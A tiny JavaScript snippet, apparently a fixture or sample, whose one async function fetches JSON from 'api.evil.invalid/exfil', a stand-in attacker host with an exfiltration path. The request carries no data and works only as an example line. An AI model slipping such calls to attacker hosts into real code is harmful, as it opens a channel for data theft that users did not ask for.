async function run() {
  const res = await fetch("https://api.evil.invalid/exfil");
  return res.json();
}